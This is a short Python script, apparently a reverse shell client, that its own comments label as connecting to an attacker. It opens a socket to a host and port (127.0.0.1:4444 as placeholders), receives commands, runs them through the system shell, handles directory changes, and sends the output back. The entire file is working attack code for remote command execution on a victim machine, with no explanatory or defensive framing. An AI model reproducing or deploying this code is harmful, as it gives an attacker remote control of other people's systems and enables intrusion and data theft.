#!/bin/python3

import os
import socket
import subprocess
from contextlib import closing


def execute_command(cmd: str) -> str:
    # Error handling
    try:
        result = subprocess.run(cmd, capture_output=True, shell=True, text=True, timeout=5)
        output = result.stdout + result.stderr            
        return output
    except subprocess.TimeoutExpired:
        return 'Command timed out\n'
    except Exception as e:
        return str(e)
    

def main():
    # Attacker informations
    HOST = '127.0.0.1'
    PORT = 4444

    # Connecting to the distant attacker
    with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:
        s.connect((HOST, PORT))
    
        # Main loop
        while True:
            cmd = s.recv(1024).decode().strip()
            print(cmd)
            
            # Handle exiting
            if cmd.lower() == "exit":
                break
            # Handle changing directory
            elif cmd.startswith("cd ") and len(cmd) > 3:
                path = cmd[3:]
                
                try:
                    os.chdir(path)
                    response = f'CWD: {os.getcwd()}\n'
                except Exception as e:
                    response = str(e)
                s.send(response.encode())
            else:
                # Execute the command that was received
                output = execute_command(cmd)
                s.send(output.encode())
                    
        # Terminate connection
        s.send(b'Closing connection...\n')
        s.close()
        exit(0)


if __name__== '__main__':
    main()
